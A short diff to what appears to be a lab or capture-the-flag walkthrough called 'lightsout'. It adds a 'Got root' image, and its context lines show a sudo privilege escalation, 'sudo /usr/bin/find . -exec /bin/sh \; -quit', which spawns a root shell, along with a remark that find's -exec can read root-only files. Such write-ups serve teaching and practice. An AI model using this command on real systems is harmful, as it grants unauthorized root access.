@@ -130,6 +130,8 @@ sudo /usr/bin/find . -exec /bin/sh \; -quit
 # id -> uid=0(root)
 ```
 
+![Got root](/assets/Images/lightsout-root.gif){: w="400" }
+
 You don't even need an interactive shell — `find`'s `-exec` is a root primitive on its own. For example, read any root-only file:
 
 ```bash
